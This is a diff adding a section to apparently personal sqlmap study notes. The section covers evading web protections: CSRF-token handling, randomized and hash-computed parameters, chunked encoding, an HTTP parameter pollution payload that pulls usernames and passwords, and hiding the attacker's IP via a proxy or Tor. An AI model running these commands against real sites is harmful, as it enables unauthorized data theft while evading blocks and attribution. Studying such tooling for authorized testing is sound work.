@@ -196,6 +196,35 @@ Then: `$ sqlmap -r req.txt`
   - Ex. `--search -T user`: Search tables containing `user` keyword
   - Ex. `--search -C pass`: Search columns containing `pass` keyword
 
+**Bypassing Web Application Protections**
+- Anti CSRF (CSRF is most common)
+  - To bypass this, we can append `--csrf-token="csrf-token"` to our command
+  - Ex. `$ sqlmap -u "http://<target>" --method POST --data "id=1&t0ken=PLACEHOLDER" --csrf-token="t0ken" --dump`
+- Unique Value Bypass
+  - Some web pages require unique values to be provided in predefined parameters
+    - This means we do not have to parse the page
+  - To bypass this, we can append `--randomize=<parameter-name>` to our command
+    - Ex. `$ sqlmap -u "http://<target>/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`
+- Calculator Parameter Bypass
+  - This is used when a web app expects a parameter value to be calculated based upon some other parameter
+  - To bypass this, we can append `--eval="<python_code>"` to our command
+    - Ex. `$ sqlmap -u "http://<target>/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`
+- IP Address Concealing
+  - If we need to conceal our ip address, or if we have been blacklisted:
+    - We can use the `--proxy` option
+      - We can view our proxies with `--proxy-file`
+      - Ex. `--proxy="socks4://177.39.187.70:33283"`
+    - We can use the TOR network
+      - `--check-tor`: Confirm TOR is working appropriately (`Congratulations` will appear in the response)
+      - `--tor`: SQLMap will automatically try to find the local port and use it appropriately
+  - WAF Bypass
+  - User-agent Blacklisting Bypass
+  - Tamper Scripts
+  - Miscellaneous Bypass
+    - Chunked transfer encoding: Splits the POST request's body into so-called "chunks," which bypasses blocked SQL keywords
+      - `--chunked`
+    - HTTP parameter pollution (HPP): Payloads are split similarly as with chunking, but between different of the same parameter names (eg. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`)
+   
 # Understanding the output
 
 - Common messages you may receive include:
